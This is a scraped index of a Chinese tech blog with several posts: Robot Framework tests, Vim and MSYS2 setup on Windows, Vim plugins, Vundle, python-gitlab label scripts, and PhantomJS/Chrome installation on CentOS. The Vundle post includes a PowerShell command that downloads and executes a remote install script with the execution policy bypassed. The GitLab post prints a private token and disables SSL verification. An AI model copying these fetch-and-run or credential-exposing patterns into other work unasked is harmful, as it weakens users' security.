实现文件下载并判断是否成功的思路是：\n根据当前的时间，创建一个独一无二的目录，用于保存下载的文件。 下载文件到上面的目录中。 通过 Wait Until Keyword Succeeds 关键字，轮询目录中是否存在一个非临时文件。 如果超时则，下载失败。如果存在一个非临时文件，则下载成功。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 *** Settings *** Library Selenium2Library Library OperatingSystem *** Test Cases *** 文件下载 [Documentation] 测试上传文件的写法 ${now} Get Time epoch ${download directory} Join Path D:\\\\Download downloads_${now} Create Directory ${download directory} ${chrome options}= Evaluate sys.modules[\u0026#39;selenium.webdriver\u0026#39;].ChromeOptions() sys, selenium.webdriver ${disabled} Create List Chrome PDF Viewer ${prefs} Create Dictionary download.default_directory=${download directory} plugins.plugins_disabled=${disabled} Call Method ${chrome options} add_experimental_option prefs ${prefs} Create Webdriver Chrome chrome_options=${chrome options} Goto https://sourceforge.net/projects/p7zip/ Maximize Browser Window Wait Until Element Is Visible css=.buttons a Click Element css=.buttons a ${file} Wait Until Keyword Succeeds 1 min 20 s 下载完成 ${download directory} [Teardown] Close Browser *** Keywords *** 下载完成 [Arguments] ${directory} ${files} List Files In Directory ${directory} Length Should Be ${files} 1 Should be only one file in the download folder Should Not Match Regexp ${files[0]} (?i).*\\\\.tmp Chrome is still downloading a file ${file} Join Path ${directory} ${files[0]} [Return] ${file} 关键字 Wait Until Keyword Succeeds 后面的两个参数 1 min 20 s ，表示尝试执行关键字的总时间为 1 min，每次尝试间隔 20 s。\n执行 JavaScript 异步执行 1 2 3 4 5 6 7 8 *** Settings *** Library Selenium2Library *** Test Cases *** 异步执行 JavaScript Open Browser https://www.baidu.com/ Chrome Sleep 3 Execute Async Javascript a = window.document.createElement(\u0026#39;script\u0026#39;);a.src=\u0026#39;https://code.jquery.com/jquery-3.3.1.min.js\u0026#39;;window.document.body.appendChild(a); 同步执行 1 2 3 4 5 6 7 8 9 10 *** Settings *** Library Selenium2Library *** Test Cases *** 同步执行 JavaScript Open Browser https://www.baidu.com/ Chrome Sleep 3 ${sum}= Execute JavaScript window.sumjs = 1+1; return window.sumjs; Log ${sum} warn Execute JavaScript alert(window.sumjs); ","description":"","id":436,"section":"post","tags":["博文","测试","自动化","DevOps"],"title":"Robot Framework 进阶 （2）","uri":"https://www.chenshaowen.com/blog/senior-of-robot-framework-2.html"},{"content":"pybot 命令 执行所有测试用例 1 pybot . 执行某个测试套件 1 pybot testsuite.txt 执行某个测试套件中的测试用例 1 pybot --test case_name testsuit.txt 将测试结果输出到固定路径 1 pybot --ouputdir your_ouput_dir testsuit.txt 执行包含某个 tag 的测试用例 1 pybot --include tag_name testsuit.txt 关于日志 默认情况下，Robot Framework 中低于 INFO 级别的日志消息不会写日志。这个阈值可以通过命令行选项 --loglevel 修改。\n在 Robot Framework 中有五种日志级别：\nFAIL 当关键字失败时使用，只能由Robot Framework自己使用\nWARN 用来展示警告， 警告消息同样会出现在 控制台以及日志文件的测试执行错误区,，不过它们不会影响到测试用例的状态\nINFO 默认的消息级别，默认情况下日志文件中不会显示低于此级别的消息\nDEBUG 用于调试目的.，当需要记录测试库内部执行过程时很有用。当关键字失败时，代码失败的地方会自动使用该级别打印 traceback 信息\nTRACE 更详细的调试级别，使用该级别时，关键字的参数和返回值会自动写入日志\n在测试用例中，可以调用内置关键字 log 输出相应的日志：\n例如：\n1 2 log \u0026#34;this is my log\u0026#34; warn log ${num} warn 输出：\n1 2 [ WARN ] \u0026#34;this is my log\u0026#34; [ WARN ] 100 第一个参数是日志内容，第二个参数是日志级别，默认是 info。\n声明变量 变量 在测试套件中：\n1 2 ${num} 100 ${string} abcdef 在测试用例中：\n1 2 ${num} Set Variable 100 ${string} Set Variable abcdef 列表 在测试套件中：\n1 2 @{num_list} 1 2 3 @{string_list} a b c 在测试用例中：\n1 2 @{num_list} Create List 1 2 3 @{string_list} Create List a b c 列表的访问方法有两种：\n@{变量名}[index] ${变量名[index]} 字典 在测试套件中：\n1 \u0026amp;{user} name=admin email=admin@admin.com 在测试用例中：\n1 \u0026amp;{user} Create Dictionary name=admin email=admin@admin.com 也可以使用标量符声明字典变量 ${user} 。\n访问方法：\n1 2 log ${user.name} log ${user[\u0026#39;name\u0026#39;]} 条件表达式 语法结构：\n1 2 3 4 5 Run Keyword If 判断条件 其他关键字 参数 ... ELSE IF 判断条件 其他关键字 参数 ... ELSE 判断条件 其他关键字 参数 例如：\n1 2 3 4 5 testCase ${n} Set Variable 3 Run Keyword If ${n}==100 log num is 100 ... ELSE IF ${n}\u0026gt;100 log num is more than 100 ... ELSE log num is less than 100 需要注意的是，关键字不区别大小写，但是这里的 ELSE ,ELSE IF 严格区分大小。\n循环表达式 语法结构：\n1 2 3 4 5 6 7 :For 变量 IN 序列(or 列表) 关键字 参数值 :For 变量 IN RANGE 循环限量 关键字 参数值 例如：\n1 2 3 4 testCase ${t} create list 123 qwe dfg : FOR ${x} IN @{t} \\ log ${x} warn 参数与返回值 在 Robot Framework 中给关键字传递参数，或者从关键字中获取返回值是很常见的操作。\n在关键字定义中，通过 [Arguments] 定义参数，也可以设置默认值 ${version}=0 。具有默认值的参数，使用时可以不传，否则必须传递。传递参数时，可以使用默认位置传递，也可以使用 key/value 的形式。\n在关键字定义中，通过 [Return] 返回值。\n1 2 3 4 5 6 7 8 9 10 *** Test Cases *** testCase ${tem} = 获取完整版本 18 log ${tem} warn *** Keywords *** 获取完整版本 [Arguments] ${version}=0 ${full_version} set variable Test-${version} [Return] ${full_version} Variables 方式扩展 Python 变量 在 Robot Framework 中，有时需要使用 Python 处理一些逻辑，获取运算值。这时，可以利用 Variable 来扩展 Python 变量。\ntest.py\n1 2 3 4 5 6 7 8 9 10 11 # -*- coding: utf-8 -*- import random class Test(object): def __init__(self): pass def random(self): return random.randint(1, 100) myrand = Test() *** Settings *** Variables test.py *** Test Cases *** testCase log ${myrand.random()} warn Library 方式扩展 Python 函数作为关键字 在 Robot Framework 中，有时需要使用 Python 封装一些操作，比如发送邮件等。这时，可以利用 Library 的方式，引入 Python 函数作为 Robot Framework 中的关键字。\nmylib.py\n1 2 3 # -*- coding: utf-8 -*- def myprint(name): return \u0026#34;Your name is :\u0026#34; + name 1 2 3 4 5 6 *** Settings *** Library ../lib/mylib.py *** Test Cases *** testCase ${name}= my_print haha log ${name} warn ","description":"","id":437,"section":"post","tags":["博文","测试","自动化","DevOps"],"title":"Robot Framework 进阶 （1）","uri":"https://www.chenshaowen.com/blog/senior-of-robot-framework-1.html"},{"content":" 之前使用过 Gygwin，也是用过 Git Bash。但在 Vim 面前，这两货都不好使，最终选择了 MSYS2 作为 Console 端。\n1. Cygwin、MinGW、MSYS2 比较 在 Windows 下，使用 Vim 的关键在于找到一个合适的 Console。在安装 Vim 插件时，合适的 Console，能帮你避开大部分坑，使你专心使用 Vim。\n特点 Cygwin MinGW/MSYS MSYS2 是否 GNU 否 是 是 更多软件支持 支持绝大多数的 GNU 软件 支持常用软件，Git、Vim 等软件需要独立支持 支持大多数 GNU 软件 更类 Linux Cygwin 在 Windows 中就好像 Wine 在 Linux 中 实现了 Bash 等主要的 Linux 程序 原生 64/32 bit 支持 GCC 编译 内含 MingGW32 交叉编译功能，既支持依赖 cygwin.dll 的程序编译，也支持独立的 Windows 程序编译；可以直接编译 Linux 下的应用程序 支持独立的 Windows 程序编译 支持独立的 Windows 程序编译 中文支持 直接支持中文显示和输入法 需要配置才能支持中文显示和输入，删除一个中文字符需要删除 2 次 支持中文显示和输入法，中文帮助系统和中文提示（部分软件） 运行速度 慢 快 快 这里果断选择 MSYS2 。因为有个坑（msys-python27.dll）绕不过。\nMSYS2 集成了 pacman 。pacman 是 Arch Linux 的软件包管理器，pacman 的常用命令如下：\n1 2 3 4 5 6 7 8 9 10 11 12 pacman -S package_name #安装软件包 pacman -R package_name #删除软件包 pacman -Rs package_name #顺便删除软件包相关依赖 pacman -Syu #升级系统中的所有包 pacman -Ss package #查询软件包 pacman -Qs package #查询已安装的包 pacman -Qi package #显示查找的包的信息 pacman -Ql package #显示你要找的包的文件都安装的位置 pacman -Sw package #下载但不安装包 pacman -U /path/package.pkg.tar.gz #安装本地包 pacman -Scc #清理包缓存，下载的包会在/var/cache 这个目录 pacman -Sf pacman #重新安装包 访问 MSYS2 官网，下载安装 MSYS2。\n2. 更新源 MSYS2 的源配置文件在 /etc/pacman.d 中。\n1 2 ls /etc/pacman.d/ gnupg mirrorlist.mingw32 mirrorlist.mingw64 mirrorlist.msys 分别将中科大的源，新增在以 mirrorlist 开头的三个源文件中。\n编辑 /etc/pacman.d/mirrorlist.mingw32 ，在文件开头添加：\n1 Server = http://mirrors.ustc.edu.cn/msys2/mingw/i686 编辑 /etc/pacman.d/mirrorlist.mingw64 ，在文件开头添加：\n1 Server = http://mirrors.ustc.edu.cn/msys2/mingw/x86_64 编辑 /etc/pacman.d/mirrorlist.msys ，在文件开头添加：\n1 Server = http://mirrors.ustc.edu.cn/msys2/msys/$arch 刷新缓存数据，执行命令：\n1 pacman -Sy 3. 安装配置 Vim 安装 Git （Vim 也会被安装上） 执行命令：\n1 pacman -S git 安装 Python 2 执行命令：\n1 pacman -S python2 配置 Vim 1 2 3 4 git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim vim ~/.vimrc # 编辑 vimrc 内容 # ... 进入 Vim 之后，执行 :PluginInstall 即可安装相关 Vim 插件。\n4. 处理乱码问题 MSYS2 显示乱码 新建文件，/usr/bin/win：\n1 2 #!/bin/bash $@ |iconv -f gbk -t utf-8 新建文件，/etc/profile.d/alias.sh：\n1 2 3 4 5 6 7 8 alias ls=\u0026#34;/bin/ls --color=tty --show-control-chars\u0026#34; alias grep=\u0026#34;/bin/grep --color\u0026#34; alias ll=\u0026#34;/bin/ls --color=tty --show-control-chars -l\u0026#34; alias ping=\u0026#34;/bin/win ping\u0026#34; alias netstat=\u0026#34;/bin/win netstat\u0026#34; alias nslookup=\u0026#34;/bin/win nslookup\u0026#34; alias ipconfig=\u0026#34;/bin/win ipconfig\u0026#34; 除了上面的方法，还可以右键窗口，选择 Options 设置中文显示：\nvim 中文乱码 在 .vimrc 文件中新增：\n1 2 3 4 5 6 7 8 9 \u0026#34; 默认编码 if has(\u0026#39;vim_starting\u0026#39;) if \u0026amp;encoding !=? \u0026#39;utf-8\u0026#39; let \u0026amp;termencoding = \u0026amp;encoding endif set encoding=utf-8 set fileencoding=utf-8 set fileencodings=ucs-bom,utf-8,default,cp936 endif 5. ConEmu 或 Cmder 配置 在 Settings 中，Startup -\u0026gt; Tasks 新增一项。\n1 set MSYS2_PATH_TYPE=inherit \u0026amp; set CHERE_INVOKING=1 \u0026amp; %ConEmuDrive%\\interpreter\\msys2_32\\usr\\bin\\bash.exe --login -i -new_console:C:\u0026#34;%ConEmuDrive%\\interpreter\\msys2_32\\msys2.ico\u0026#34; 6. 参考 https://github.com/ets-labs/python-vimrc https://vimawesome.com/ https://wizardforcel.gitbooks.io/use-vim-as-ide/content/0.html https://vim-adventures.com/ https://blog.zengrong.net/post/1557.html ","description":"","id":438,"section":"post","tags":["博文","Vim","工具","Windows"],"title":"Windows 下正确使用 Vim 的方式","uri":"https://www.chenshaowen.com/blog/correct-way-to-use-vim-on-windows.html"},{"content":"1. nerdtree 生成文件目录树 1 2 \u0026#34; 文件目录树 Plugin \u0026#39;scrooloose/nerdtree\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026#34;===================================================== \u0026#34;\u0026#34; NERDTree 配置 \u0026#34;===================================================== let NERDTreeChDirMode=1 \u0026#34;显示书签\u0026#34; let NERDTreeShowBookmarks=1 \u0026#34;设置忽略文件类型\u0026#34; let NERDTreeIgnore=[\u0026#39;\\~$\u0026#39;, \u0026#39;\\.pyc$\u0026#39;, \u0026#39;\\.swp$\u0026#39;,\u0026#39;\\.pyo$\u0026#39;, \u0026#39;__pycache__$\u0026#39;] \u0026#34;窗口大小\u0026#34; let NERDTreeWinSize=40 autocmd VimEnter * if !argc() | NERDTree | endif \u0026#34; Load NERDTree only if vim is run without arguments \u0026#34;按 F2 开启和关闭目录树\u0026#34; map \u0026lt;F2\u0026gt; :NERDTreeToggle\u0026lt;CR\u0026gt; 常用快捷键\n快捷键 操作 ctrl + w + w 光标自动在左右侧窗口切换 o 展开左侧某个目录，再按一下就是合并目录 t 在新 Tab 中打开选中文件/书签，并跳到新 Tab T 在新 Tab 中打开选中文件/书签，但不跳到新 Tab P 跳到根结点 q 关闭 NerdTree 窗口 :tabc 关闭当前的 tab :tabo 关闭所有其他的 tab 效果图：\n2. vim-colorschemes 自定义显示主题 flazz/vim-colorschemes 内置了很多配色方案，可以自行选择。\n1 2 \u0026#34; 主题 Plugin \u0026#39;flazz/vim-colorschemes\u0026#39; 1 2 3 4 5 6 \u0026#34;===================================================== \u0026#34;\u0026#34; Vim-colorschemes 配置 \u0026#34;===================================================== syntax enable \u0026#34; syntax highlight set t_Co=256 \u0026#34; set 256 colors colorscheme wombat256mod \u0026#34; set color scheme 效果图：\n3. vim-airline 状态条 bling/vim-airline 用于定制强化状态条。\n1 2 \u0026#34; 状态条 Plugin \u0026#39;bling/vim-airline\u0026#39; 1 2 3 4 5 6 7 8 9 10 \u0026#34;===================================================== \u0026#34;\u0026#34; vim-airline 配置 \u0026#34;===================================================== set t_Co=256 \u0026#34; Explicitly tell Vim that the terminal supports 256 colors set laststatus=2 let g:airline_powerline_fonts=1 let g:airline#extensions#tabline#enabled=1 \u0026#34; enable tabline let g:airline#extensions#tabline#buffer_nr_show=1 \u0026#34; 显示buffer行号 let g:airline_theme=\u0026#34;solarized\u0026#34; \u0026#34;set ambiwidth=double \u0026#34; When iTerm set double-width characters, set it 效果图：\n4. tagbar 代码分析 majutsushi/tagbar 可以快速的分析代码的函数、类定义。\n首先得安装下 ctag，在 Windows 下可以执行: choco install ctags\n1 2 \u0026#34; 代码分析 Plugin \u0026#39;majutsushi/tagbar\u0026#39; 1 2 3 4 \u0026#34;===================================================== \u0026#34;\u0026#34; tagbar 配置 \u0026#34;===================================================== nmap \u0026lt;F8\u0026gt; :TagbarToggle\u0026lt;CR\u0026gt; 效果图：\n5. ag.vim 内容查找 rking/ag.vim 是一个查找速度比 ack 还要快的搜索插件。\n首先得安装下 ag，在 Windows 下可以执行: choco install ag\n1 2 \u0026#34; 内容查找 Plugin \u0026#39;rking/ag.vim\u0026#39; ","description":"","id":439,"section":"post","tags":["博文","Vim","插件","工具"],"title":"Vim 必备插件","uri":"https://www.chenshaowen.com/blog/vim-necessary-plugin.html"},{"content":"1. Vim 简介 Vim 是基于 vi 发展出来的一个编辑器，第一个版本由布萊姆·米勒在 1991 年发布。最初的名称是 Vi IMitation，随着功能的不断增加，正式更名为 Vi IMproved。\n上面是常见编辑器的学习曲线。对于大多数用户， Vim 有着比较陡峭的学习曲线。也就是说刚开始学习时，会感到很吃力，甚至放弃。但是，一旦掌握了一些基本操作之后，能大幅度提高编辑效率。这也是我学习 Vim 的主要原因。\n这里是 Vim 下载地址。由于生产 PC 预装的是 Windows OS，我选择的是 gvim。\n2. vimrc 配置文件 Vim 的强大之处在于，它能通过配置满足各种各样的开发需求。\n在 Windows 下，Vim 的配置文件名为 _vimrc ，位于 vim 的安装目录下。而在 Linux 系统下，配置文件名为 .vimrc 。这是因为 Windows 下以点开头的文件名不合法。\n3. 安装插件管理工具 Vundle Vim 插件管理工具有很多，例如，Pathogen、Vundle、NeoBundle 、VAM。但是，使用 Vundle 管理插件的用户最多。\n用 Vundle 管理插件，就像是在维护 requirements.txt 或 package.json 一样。只不过，这里维护的是 vimrc 文件。\n3.1 安装 git 和 curl Vundle 依赖于 git 和 curl 命令。这里通过 chocolatey 来安装。chocolatey 是 Windows 下的包管理器工具，类似于 apt-get 或 yum。\n以管理员权限执行如下命令，安装 chocolatey：\n1 @\u0026#34;%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#34; -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \u0026#34;iex ((New-Object System.Net.WebClient).DownloadString(\u0026#39;https://chocolatey.org/install.ps1\u0026#39;))\u0026#34; \u0026amp;\u0026amp; SET \u0026#34;PATH=%PATH%;%ALLUSERSPROFILE%\\chocolatey\\bin\u0026#34; 接着执行如下命令，安装 git 和 curl：\n1 2 choco install -y git choco install -y curl 3.2 安装 Vundle 在 Vim 的安装目录下，找到 vimfiles，在该目录下创建 bundle 文件夹。\nVim/vimfiles/bundle 目录下执行：\n1 git clone https://github.com/VundleVim/Vundle.vim.git 4. 使用 Vundle 安装插件 4.1 安装插件 利用 Vundle，通过配置文件 vimrc 有两种写法可以安装插件：\n在 vundle#begin() 和 vundle#end() 之间，配置行 Plugin '插件名' 直接配置一行 Bundle '插件名' 值得一提的是，如何获取插件名。\n首先去 github 找到需要的插件，比如一个格式化前端的插件。插件的 github 地址：https://github.com/maksimr/vim-jsbeautify 。这里的 maksimr/vim-jsbeautify 就是 Vundle 需要的插件名。当然 Vundle 不仅仅支持来自 github 的网络安装，其他来源需要填写完整的 git 地址。\n安装时，在 vimrc 文件中新增如下内容：\n1 2 3 4 5 6 7 8 call vundle#begin() Plugin \u0026#39;VundleVim/Vundle.vim\u0026#39; \u0026#34; javascript，html，css，json格式化工具 Plugin \u0026#39;maksimr/vim-jsbeautify\u0026#39; call vundle#end() \u0026#34; 文档树 Bundle \u0026#39;scrooloose/nerdtree\u0026#39; 在 Windows 找到 Gvim 图标，点击进入。然后，执行 :PluginInstall ，插件就被安装上了。如下图：\n除了利用 Vim 的 normal 模式安装，还可以直接执行命令\n1 vim -E -u _vimrc +qall 4.2 Vundle 常见命令 在 normal 模式下，执行命令：\n1 2 3 4 :PluginInstall // 安装插件 :BundleInstall // 安装插件 :BundleInstall! // 更新插件 :BundleClean // 卸载插件 5. 使用 git bash 中的 Vim 但是，Windows 下 Gvim 的窗口与 Dos 的窗口一样大。因此，推荐安装 Git for Windows ，在 Git Bash 中使用 Vim，下载地址。\n大屏效果：\n安装 Vundle 1 git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim 编辑配置文件 vimrc 1 vim ~/.vimrc 这里的配置文件名、路径与 Linux 一样。\n粘贴 Vundle 官方示例配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 set nocompatible \u0026#34; 去除VI一致性,必须 filetype off \u0026#34; 必须 \u0026#34; 设置包括vundle和初始化相关的runtime path set rtp+=~/.vim/bundle/Vundle.vim call vundle#begin() \u0026#34; 另一种选择, 指定一个vundle安装插件的路径 \u0026#34;call vundle#begin(\u0026#39;~/some/path/here\u0026#39;) \u0026#34; 让vundle管理插件版本,必须 Plugin \u0026#39;VundleVim/Vundle.vim\u0026#39; \u0026#34; 以下范例用来支持不同格式的插件安装. \u0026#34; 请将安装插件的命令放在vundle#begin和vundle#end之间. \u0026#34; Github上的插件 \u0026#34; 格式为 Plugin \u0026#39;用户名/插件仓库名\u0026#39; Plugin \u0026#39;tpope/vim-fugitive\u0026#39; \u0026#34; 来自 http://vim-scripts.org/vim/scripts.html 的插件 \u0026#34; Plugin \u0026#39;插件名称\u0026#39; 实际上是 Plugin \u0026#39;vim-scripts/插件仓库名\u0026#39; 只是此处的用户名可以省略 Plugin \u0026#39;L9\u0026#39; \u0026#34; 由Git支持但不再github上的插件仓库 Plugin \u0026#39;git clone 后面的地址\u0026#39; Plugin \u0026#39;git://git.wincent.com/command-t.git\u0026#39; \u0026#34; 本地的Git仓库(例如自己的插件) Plugin \u0026#39;file:///+本地插件仓库绝对路径\u0026#39; Plugin \u0026#39;file:///home/gmarik/path/to/plugin\u0026#39; \u0026#34; 插件在仓库的子目录中. \u0026#34; 正确指定路径用以设置runtimepath. 以下范例插件在sparkup/vim目录下 Plugin \u0026#39;rstacruz/sparkup\u0026#39;, {\u0026#39;rtp\u0026#39;: \u0026#39;vim/\u0026#39;} \u0026#34; 安装L9，如果已经安装过这个插件，可利用以下格式避免命名冲突 Plugin \u0026#39;ascenator/L9\u0026#39;, {\u0026#39;name\u0026#39;: \u0026#39;newL9\u0026#39;} \u0026#34; 你的所有插件需要在下面这行之前 call vundle#end() \u0026#34; 必须 filetype plugin indent on \u0026#34; 必须 加载vim自带和插件相应的语法和文件类型相关脚本 \u0026#34; 忽视插件改变缩进,可以使用以下替代: \u0026#34;filetype plugin on \u0026#34; \u0026#34; 简要帮助文档 \u0026#34; :PluginList - 列出所有已配置的插件 \u0026#34; :PluginInstall - 安装插件,追加 `!` 用以更新或使用 :PluginUpdate \u0026#34; :PluginSearch foo - 搜索 foo ; 追加 `!` 清除本地缓存 \u0026#34; :PluginClean - 清除未使用插件,需要确认; 追加 `!` 自动批准移除未使用插件 \u0026#34; \u0026#34; 查阅 :h vundle 获取更多细节和wiki以及FAQ \u0026#34; 将你自己对非插件片段放在这行之后 6. 参考 https://github.com/ets-labs/python-vimrc ","description":"","id":440,"section":"post","tags":["博文","Vim","工具","Windows"],"title":"Windows 下 Vim 安装与配置","uri":"https://www.chenshaowen.com/blog/vim-installation-and-configuration-on-windows-os.html"},{"content":" 利用 Gitlab issue 进行项目管理是一件对 Dev 十分友好的事。录入issue、发起 Merge Request、创建 milestone，这些都是开发过程中动态推进的。但，每个新项目都需要创建一堆 Label ，是件让人头疼的事。本文主要就是为了解决这个问题。\n1. GitLab Label 在创建 GitLab Label 之前，我们先得规范一下 Label 的格式。\nGitLab Label 主要用于对 issue 分类管理和过滤查看。比较推荐的一种用法是，\n采用 \u0026ldquo;{type}/{value}\u0026rdquo; 标签，而不是 \u0026ldquo;{value}\u0026quot;。这样的二维标签可以表示更多的信息。\n1.1 标签类别 type/feature\n对新功能的请求\ntype/enhancement\n对功能的改进、增强、重构。\ntype/bug\n不符合预期的小问题\ntype/question\n比较严重的问题\ntype/test\n与测试相关的问题\n1.2 优先级：priority 优先级标签指定应处理问题的优先级。\npriority/critical\n这个问题现在应该修复\npriority/high\n这个问题应该尽快解决\npriority/low\n这个问题不是高优先级问题，可以在以后处理。该标签允许记录问题，而无需立即处理\n1.3 价值 价值标签描述了谁从这个问题中受益。这有助于更好地安排问题。\nvalue/client\n这个问题将使客户受益\nvalue/admin\n这个问题将使管理员用户受益。有时管理员用户不一定是客户端\nvalue/developer\n这个问题将使开发人员受益\n1.4 更改 更改标签对所涉及的变化进行了粗略估计。\nchange/minor\n这个问题通常需要几个小时或更短的时间。\nchange/medium\n这个问题花了不到一天的时间，但这不是一个快速解决方案。\nchange/major\n这个问题涉及重大变化，需要1天以上。\n1.5 杂项 这些是非常重要的标签，应根据需要使用。\nothers/needs-discussion\n这个问题需要进一步讨论才能得到解决。 我们会尽可能多地查询具有此标签的所有内容，并与相关各方进行讨论。一旦我们完成讨论，我们通常会删除标签，但有时我们无法决定我们想要决定的内容，因此我们将标签留在那里，将项目推送到下一次会议。\nothers/in-progress\n这个问题正在进行中。此标签告诉正在处理该问题的人（分配标签的人）并阻止其他人开始处理同一问题。\nothers/duplicate\n这个问题与另一个功能请求或错误报告重复。\n2. gitlab-python python-gitlab 是一个 Python 软件包，提供对 GitLab 服务器 API 的访问。它支持 GitLab 的 v3 和 v4 API，并提供了一个 CLI 工具。\npython-gitlab 兼容 Python 2.7 和 Python 3.4 及以上版本。\n2.1 安装 python-gitlab 1 pip install python-gitlab -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com 2.2 配置访问权限 这里将配置文件放在 $HOME 目录下。\n1 vim ~/.python-gitlab.cfg python-gitlab 还支持配置系统级的访问权限文件，启动时指定配置访问权限文件。具体配置，请参考这里。\n1 2 3 4 5 6 7 8 9 [global] default = gitlab-yourdomain ssl_verify = false timeout = 5 [gitlab-yourdomain] url = https://gitlab.yourdomain.com private_token = _AR7QqJ-hp4zLbZjVi6S api_version = 4 这里的 private_token 可以在你的 GitLab 主页生成，http://gitlab.yourdomain.com/profile/personal_access_tokens。如下图：\n2.3 常用命令 Console 中获取第一页 project 1 gitlab project list Python 脚本 在 Python 脚本中访问 GitLab API 需要先获取到 gitlab 操作实例。\n1 2 3 4 5 6 7 8 9 10 11 import gitlab gitlab_url = \u0026#39;http://gitlab.yourdomain.com\u0026#39; gitlab_token = \u0026#39;_AR7QqJ-hp4zLbZjVi6S\u0026#39; # 登录 gl = gitlab.Gitlab(gitlab_url, gitlab_token) # 获取第一页 project projects = gl.projects.list() # 获取所有的project projects = gl.projects.list(all=True) 这里是创建项目需要的 Label 的 Python 脚本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 # -*- coding: utf-8 -*- import gitlab gitlab_url = \u0026#39;http://gitlab.yourdomain.com\u0026#39; gitlab_token = \u0026#39;_AR7QqJ-hp4zLbZjVi6S\u0026#39; # 登录 gl = gitlab.Gitlab(gitlab_url, gitlab_token) # 通过 \u0026#34;空间名/项目\u0026#34;\u0026#34;名获取 project 对象 project = gl.projects.get(\u0026#39;namespace/project_name\u0026#39;) # 获取所有 label labels = project.labels.list() # 删除全部 label for label in labels: label.delete() # 创建项目的 label # 类型 type # 优先级 priority # 价值 value # 更改 changeA # 杂项 others all_label_list = { \u0026#39;type\u0026#39;: [(\u0026#39;feature\u0026#39;, \u0026#39;#52BE80\u0026#39;), (\u0026#39;enhancement\u0026#39;, \u0026#39;#5DADE2\u0026#39;), (\u0026#39;bug\u0026#39;, \u0026#39;#E59866\u0026#39;), (\u0026#39;question\u0026#39;, \u0026#39;#D35400\u0026#39;), (\u0026#39;test\u0026#39;, \u0026#39;#A9CCE3\u0026#39;)], \u0026#39;priority\u0026#39;: [(\u0026#39;critical\u0026#39;, \u0026#39;#E74C3C\u0026#39;), (\u0026#39;high\u0026#39;, \u0026#39;#F4D03F\u0026#39;), (\u0026#39;low\u0026#39;, \u0026#39;#F5CBA7\u0026#39;)], \u0026#39;value\u0026#39;: [(\u0026#39;client\u0026#39;, \u0026#39;#AED6F1\u0026#39;), (\u0026#39;admin\u0026#39;, \u0026#39;#D6DBDF\u0026#39;), (\u0026#39;developer\u0026#39;, \u0026#39;#3498DB\u0026#39;)], \u0026#39;change\u0026#39;: [(\u0026#39;minor\u0026#39;, \u0026#39;#EBDEF0\u0026#39;), (\u0026#39;medium\u0026#39;, \u0026#39;#BB8FCE\u0026#39;), (\u0026#39;major\u0026#39;, \u0026#39;#8E44AD\u0026#39;)], \u0026#39;others\u0026#39;: [(\u0026#39;needs-discussion\u0026#39;, \u0026#39;#2E86C1\u0026#39;), (\u0026#39;in-progress\u0026#39;, \u0026#39;#D68910\u0026#39;), (\u0026#39;duplicate\u0026#39;, \u0026#39;#85929E\u0026#39;)]} for key in all_label_list: for label in all_label_list[key]: project.labels.create( {\u0026#39;name\u0026#39;: \u0026#39;\u0026#39;.join([key, \u0026#39;/\u0026#39;, label[0]]), \u0026#39;color\u0026#39;: label[1]}) # 创建一个 tag # tag = project.tags.create({\u0026#39;tag_name\u0026#39;:\u0026#39;V1.0.0\u0026#39;, \u0026#39;ref\u0026#39;:\u0026#39;master\u0026#39;}) # 获取所有 commit info # commits = project.commits.list() # for c in commits: # print c.author_name, c.message, c.title # 获取指定 commit 的 info # commit = project.commits.get(\u0026#39;2f597633\u0026#39;) # 创建一个 merge request # mr = project.mergerequests.create({\u0026#39;source_branch\u0026#39;:\u0026#39;bugfix\u0026#39;, # \u0026#39;target_branch\u0026#39;:\u0026#39;master\u0026#39;, # \u0026#39;title\u0026#39;:\u0026#39;fix db coding\u0026#39;, }) # 更新一个 merge request 的描述 # mr.description = \u0026#39;some description\u0026#39; # mr.save() 执行之后的效果，是这样：\n3. 参考 http://python-gitlab.readthedocs.io/en/stable/ http://docs.sitestacker.com/articles/gitlab-labels.html ","description":"","id":441,"section":"post","tags":["博文","GitLab","项目管理","DevOps"],"title":"如何使用 python-gitlab 自动创建 GitLab Label","uri":"https://www.chenshaowen.com/blog/how-to-create-gitlab-label-using-python-gitlab.html"},{"content":"1. 安装无头浏览器 1.1 CentOS 安装 Phantomjs 下载并解压 访问 Phantomjs ，找到 Download phantomjs-2.1.1-linux-x86_64.tar.bz2 的下载链接，并拷贝。\n在 CentOS 执行命令:\n1 2 3 4 5 wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2 # 如果没有安装 bzip2 可能会报错 yum install bzip2.x86_64 tar -jxvf phantomjs-2.1.1-linux-x86_64.tar.bz2 mv phantomjs-2.1.1-linux-x86_64 /usr/local/ 添加到环境变量 1 vim /etc/profile 在行尾新增，如下内容\n1 export PATH=$PATH:/usr/local/phantomjs-2.1.1-linux-x86_64/bin 使环境变量立即生效\n1 source /etc/profile 查看 Phantomjs 版本号\n1 phantomjs --version 安装完之后，发现 Phantomjs 官网有这么一句提示：Important: PhantomJS development is suspended until further notice 。意思是 PhantomJS 暂停开发了，心碎。在 Robot Framework 中使用 PhantomJS 时，Console 也会输出类似提示。\n不过没关系，PhantomJS 只是无头浏览器的一种， Chrome 浏览器从 59 的版本开始新增加了一种模式 - 无头模式 headless。也就是说，可以用 Chrome headless 替代 PhantomJS 。\n1.2 CentOS 安装 Chrome 配置安装源 1 2 cd /ect/yum.repos.d/ vi google-chrome.repo 新增如下内容：\n1 2 3 4 5 6 [google-chrome] name=google-chrome baseurl=http://dl.google.com/linux/chrome/rpm/stable/$basearch enabled=1 gpgcheck=1 gpgkey=https://dl-ssl.google.com/linux/linux_signing_key.pub 开始安装： 1 yum install google-chrome-stable 查看 